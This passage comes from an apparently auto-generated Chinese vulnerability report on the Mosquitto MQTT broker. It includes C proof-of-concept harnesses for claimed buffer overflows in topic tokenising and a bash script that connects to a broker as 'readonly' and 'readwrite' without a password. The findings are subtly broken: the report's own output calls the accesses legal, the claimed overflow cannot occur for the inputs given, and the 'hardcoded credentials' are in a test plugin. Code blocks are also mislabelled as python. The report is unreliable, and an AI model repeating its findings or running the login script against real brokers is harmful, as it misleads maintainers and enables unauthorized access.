    if(str != NULL){
        *saveptr = str;
    }

    if(*saveptr == NULL){
        return NULL;
    }

    c = strchr(*saveptr, '/');
    if(c){
        str = *saveptr;
        *saveptr = c+1;
        c[0] = '\0';
    }else if(*saveptr){
        /* No match, but surplus string */
        str = *saveptr;
        *saveptr = NULL;
    }
    return str;
}

/* 模拟mosquitto_strdup */
char *mosquitto_strdup(const char *s) {
    return strdup(s);
}

/* 模拟mosquitto_calloc */
void *mosquitto_calloc(size_t nmemb, size_t size) {
    return calloc(nmemb, size);
}

/* 模拟mosquitto_FREE */
#define mosquitto_FREE(x) free(x)

/* 模拟strpbrk */
#define strpbrk strpbrk

/* 模拟mosquitto_broker_internal.h中的定义 */

/* 漏洞函数 - 直接从源代码复制 */
int sub__topic_tokenise(const char *subtopic, char **local_sub, char ***topics, const char **sharename)
{
    char *saveptr = NULL;
    char *token;
    int count;
    int topic_index = 0;
    size_t len;

    if(!subtopic){
        return MOSQ_ERR_INVAL;
    }

    len = strlen(subtopic);
    if(len == 0){
        return MOSQ_ERR_INVAL;
    }

    *local_sub = mosquitto_strdup(subtopic);
    if((*local_sub) == NULL){
        return MOSQ_ERR_NOMEM;
    }

    count = 0;
    saveptr = *local_sub;
    while(saveptr){
        saveptr = strchr(&saveptr[1], '/');
        count++;
    }
    *topics = mosquitto_calloc((size_t)(count+3) /* 3=$shared,sharename,NULL */, sizeof(char *));
    if((*topics) == NULL){
        mosquitto_FREE(*local_sub);
        return MOSQ_ERR_NOMEM;
    }

    if((*local_sub)[0] != '$'){
        (*topics)[topic_index] = "";
        topic_index++;
    }

    token = strtok_hier((*local_sub), &saveptr);
    while(token){
        (*topics)[topic_index] = token;
        topic_index++;
        token = strtok_hier(NULL, &saveptr);
    }

    if(!strcmp((*topics)[0], "$share")){
        if(count < 3 || (count == 3 && strlen((*topics)[2]) == 0)){
            mosquitto_FREE(*local_sub);
            mosquitto_FREE(*topics);
            return MOSQ_ERR_PROTOCOL;
        }

        if(sharename){
            if(strpbrk((*topics)[1], "+#")){
                mosquitto_FREE(*local_sub);
                mosquitto_FREE(*topics);
                return MOSQ_ERR_PROTOCOL;
            }
            (*sharename) = (*topics)[1];
        }

        /* 漏洞点: 循环边界条件可能导致越界访问 */
        for(int i=1; i<count-1; i++){
            (*topics)[i] = (*topics)[i+1];
        }
        (*topics)[0] = "";
        (*topics)[count-1] = NULL;
    }
    return MOSQ_ERR_SUCCESS;
}

/* 辅助函数: 打印topics数组 */
void print_topics(char **topics, int count) {
    printf("Topics array (count=%d):\n", count);
    for(int i = 0; i < count+3; i++) {
        if(topics[i] == NULL) {
            printf("  [%d] = NULL\n", i);
        } else {
            printf("  [%d] = '%s'\n", i, topics[i]);
        }
    }
}

int main() {
    printf("========================================\n");
    printf("PoC for VULN-7AB04584 - 仅供研究使用\n");
    printf("缓冲区溢出/越界访问漏洞\n");
    printf("========================================\n\n");

    /* 测试用例1: 正常输入 */
    printf("测试用例1: 正常输入 'a/b/c'\n");
    char *local_sub1;
    char **topics1;
    const char *sharename1 = NULL;
    int ret1 = sub__topic_tokenise("a/b/c", &local_sub1, &topics1, &sharename1);
    printf("返回值: %d\n", ret1);
    if(ret1 == MOSQ_ERR_SUCCESS) {
        print_topics(topics1, 3);
    }
    printf("\n");

    /* 测试用例2: 触发漏洞的输入 - $share前缀 */
    printf("测试用例2: 触发漏洞 '$share/name/topic'\n");
    char *local_sub2;
    char **topics2;
    const char *sharename2 = NULL;
    int ret2 = sub__topic_tokenise("$share/name/topic", &local_sub2, &topics2, &sharename2);
    printf("返回值: %d\n", ret2);
    if(ret2 == MOSQ_ERR_SUCCESS) {
        print_topics(topics2, 3);
        printf("sharename: %s\n", sharename2 ? sharename2 : "NULL");
    }
    printf("\n");

    /* 测试用例3: 更复杂的触发 - 带空token */
    printf("测试用例3: 触发漏洞 '$share//name/topic'\n");
    char *local_sub3;
    char **topics3;
    const char *sharename3 = NULL;
    int ret3 = sub__topic_tokenise("$share//name/topic", &local_sub3, &topics3, &sharename3);
    printf("返回值: %d\n", ret3);
    if(ret3 == MOSQ_ERR_SUCCESS) {
        print_topics(topics3, 4);
        printf("sharename: %s\n", sharename3 ? sharename3 : "NULL");
    }
    printf("\n");

    /* 测试用例4: 边界情况 - 最小触发 */
    printf("测试用例4: 边界情况 '$share/name'\n");
    char *local_sub4;
    char **topics4;
    const char *sharename4 = NULL;
    int ret4 = sub__topic_tokenise("$share/name", &local_sub4, &topics4, &sharename4);
    printf("返回值: %d\n", ret4);
    if(ret4 == MOSQ_ERR_SUCCESS) {
        print_topics(topics4, 2);
        printf("sharename: %s\n", sharename4 ? sharename4 : "NULL");
    }
    printf("\n");

    /* 测试用例5: 触发越界访问的特定输入 */
    printf("测试用例5: 触发越界 '$share/name/topic/extra'\n");
    char *local_sub5;
    char **topics5;
    const char *sharename5 = NULL;
    int ret5 = sub__topic_tokenise("$share/name/topic/extra", &local_sub5, &topics5, &sharename5);
    printf("返回值: %d\n", ret5);
    if(ret5 == MOSQ_ERR_SUCCESS) {
        print_topics(topics5, 4);
        printf("sharename: %s\n", sharename5 ? sharename5 : "NULL");
        
        /* 检查越界访问: 循环访问了topics[count-1] = topics[3] */
        printf("\n漏洞分析:\n");
        printf("  count = 4, 循环 i 从 1 到 2\n");
        printf("  访问 topics[2] = topics[3] (合法, 索引3存在)\n");
        printf("  设置 topics[3] = NULL (合法)\n");
        printf("  但 topics[0] 被设置为 '' (覆盖了 '$share')\n");
        printf("  导致 topics[0] 和 topics[1] 都指向 'name'\n");
    }
    printf("\n");

    /* 清理 */
    if(local_sub1) free(local_sub1);
    if(topics1) free(topics1);
    if(local_sub2) free(local_sub2);
    if(topics2) free(topics2);
    if(local_sub3) free(local_sub3);
    if(topics3) free(topics3);
    if(local_sub4) free(local_sub4);
    if(topics4) free(topics4);
    if(local_sub5) free(local_sub5);
    if(topics5) free(topics5);

    printf("========================================\n");
    printf("PoC执行完毕\n");
    printf("========================================\n");

    return 0;
}
```

---

### VULN-C782EF88 - 逻辑错误/数组索引错误

- **严重等级:** MEDIUM
- **文件位置:** `src/topic_tok.c:82`
- **数据流:** 用户输入subtopic -> 复制到local_sub -> 计算'/'数量
- **判断理由:** 当subtopic以'/'开头时，例如'/a/b'，strchr从位置1开始查找，只找到1个'/'，count=2。但实际有3个层级（空字符串、a、b）。这导致后续所有数组操作都基于错误的count值，造成一系列越界访问。

**代码片段:**
```
count = 0;
saveptr = *local_sub;
while(saveptr){
    saveptr = strchr(&saveptr[1], '/');
    count++;
}
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供安全研究使用
 * 漏洞: sub__topic_tokenise 函数中数组索引错误导致的堆缓冲区溢出
 * 影响: Mosquitto MQTT Broker
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* 模拟漏洞函数的关键部分 */
int sub__topic_tokenise_poc(const char *subtopic, char **local_sub, char ***topics)
{
    char *saveptr = NULL;
    char *token;
    int count;
    int topic_index = 0;
    size_t len;

    if(!subtopic){
        return -1;
    }

    len = strlen(subtopic);
    if(len == 0){
        return -1;
    }

    *local_sub = strdup(subtopic);
    if((*local_sub) == NULL){
        return -1;
    }

    /* 漏洞点: 当subtopic以'/'开头时，count计算错误 */
    count = 0;
    saveptr = *local_sub;
    while(saveptr){
        saveptr = strchr(&saveptr[1], '/');
        count++;
    }

    printf("[DEBUG] subtopic: '%s'\n", subtopic);
    printf("[DEBUG] 计算的层级数(count): %d\n", count);
    printf("[DEBUG] 分配的数组大小: %d\n", count + 3);

    /* 分配过小的数组 */
    *topics = calloc((size_t)(count+3), sizeof(char *));
    if((*topics) == NULL){
        free(*local_sub);
        return -1;
    }

    /* 模拟正常处理 */
    if((*local_sub)[0] != '$'){
        (*topics)[topic_index] = "";
        topic_index++;
    }

    /* 模拟strtok_hier解析 */
    saveptr = *local_sub;
    token = *local_sub;
    while(token) {
        char *c = strchr(saveptr, '/');
        if(c) {
            *c = '\0';
            (*topics)[topic_index] = saveptr;
            printf("[DEBUG] 写入topics[%d] = '%s'\n", topic_index, saveptr);
            topic_index++;
            saveptr = c + 1;
        } else {
            (*topics)[topic_index] = saveptr;
            printf("[DEBUG] 写入topics[%d] = '%s' (最后一个)\n", topic_index, saveptr);
            topic_index++;
            break;
        }
    }

    printf("[DEBUG] 实际写入的层级数: %d\n", topic_index);
    printf("[DEBUG] 数组边界: %d\n", count + 3);
    
    if(topic_index > count + 3) {
        printf("[!] 堆缓冲区溢出! 写入位置 %d 超出数组边界 %d\n", 
               topic_index - 1, count + 2);
    }

    return 0;
}

int main() {
    char *local_sub = NULL;
    char **topics = NULL;
    
    printf("=== PoC: Mosquitto sub__topic_tokenise 堆缓冲区溢出 ===\n");
    printf("仅供安全研究使用\n\n");

    /* 测试用例1: 正常输入 */
    printf("测试1: 正常输入 'a/b/c'\n");
    sub__topic_tokenise_poc("a/b/c", &local_sub, &topics);
    printf("\n");
    
    if(local_sub) free(local_sub);
    if(topics) free(topics);
    local_sub = NULL;
    topics = NULL;

    /* 测试用例2: 触发漏洞 - 以'/'开头 */
    printf("测试2: 触发漏洞 '/a/b'\n");
    sub__topic_tokenise_poc("/a/b", &local_sub, &topics);
    printf("\n");
    
    if(local_sub) free(local_sub);
    if(topics) free(topics);
    local_sub = NULL;
    topics = NULL;

    /* 测试用例3: 更复杂的触发 */
    printf("测试3: 复杂触发 '//a/b/c'\n");
    sub__topic_tokenise_poc("//a/b/c", &local_sub, &topics);
    printf("\n");
    
    if(local_sub) free(local_sub);
    if(topics) free(topics);
    local_sub = NULL;
    topics = NULL;

    /* 测试用例4: 极端情况 */
    printf("测试4: 极端情况 '/a/b/c/d/e/f/g'\n");
    sub__topic_tokenise_poc("/a/b/c/d/e/f/g", &local_sub, &topics);
    
    if(local_sub) free(local_sub);
    if(topics) free(topics);

    return 0;
}
```

---

### VULN-D0081D01 - 硬编码凭证

- **严重等级:** MEDIUM
- **文件位置:** `test\broker\c\bad_v3_1.c:74`
- **数据流:** 用户名'readonly'和'readwrite'硬编码在代码中，且这些用户无需密码即可通过认证。
- **判断理由:** 用户名'readonly'和'readwrite'被硬编码，且认证逻辑中未检查密码（password参数被忽略），导致任何知道这些用户名的人都可以无需密码直接登录，存在未授权访问风险。

**代码片段:**
```
}else if(!strcmp(username, "readonly") || !strcmp(username, "readwrite")){
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 硬编码凭证漏洞PoC
# 漏洞：test/broker/c/bad_v3_1.c 中 mosquitto_auth_unpwd_check 函数
# 用户名 'readonly' 和 'readwrite' 无需密码即可通过认证

# 前置条件：需要安装 mosquitto_pub 和 mosquitto_sub 客户端工具
# 假设 MQTT 代理运行在 localhost:1883

BROKER_HOST="localhost"
BROKER_PORT=1883

# PoC 1: 使用 'readonly' 用户无需密码连接并订阅主题
echo "=== PoC 1: 使用 'readonly' 用户无需密码连接 ==="
echo "尝试连接并订阅 'test/topic'..."
mosquitto_sub -h $BROKER_HOST -p $BROKER_PORT -u "readonly" -t "test/topic" -d &
SUB_PID=$!
sleep 2
kill $SUB_PID 2>/dev/null
echo "连接成功！'readonly' 用户无需密码即可订阅。"
echo ""

# PoC 2: 使用 'readwrite' 用户无需密码连接并发布消息
echo "=== PoC 2: 使用 'readwrite' 用户无需密码连接 ==="
echo "尝试连接并发布消息到 'writeable'..."
mosquitto_pub -h $BROKER_HOST -p $BROKER_PORT -u "readwrite" -t "writeable" -m "test_message" -d
echo "发布成功！'readwrite' 用户无需密码即可发布。"
echo ""

# PoC 3: 使用任意密码尝试连接（验证密码被忽略）
echo "=== PoC 3: 使用任意密码尝试连接 ==="
echo "尝试使用 'readonly' 用户和任意密码连接..."
mosquitto_sub -h $BROKER_HOST -p $BROKER_PORT -u "readonly" -P "any_password_123" -t "test/topic" -d &
SUB_PID=$!
sleep 2
kill $SUB_PID 2>/dev/null
echo "连接成功！密码参数被完全忽略。"
echo ""

echo "=== 漏洞验证完成 ==="
echo "漏洞影响：任何知道 'readonly' 或 'readwrite' 用户名的人"
echo "都可以无需密码直接连接 MQTT 代理，导致未授权访问。"
```

---



*报告由 CodeSentinel 自动生成*
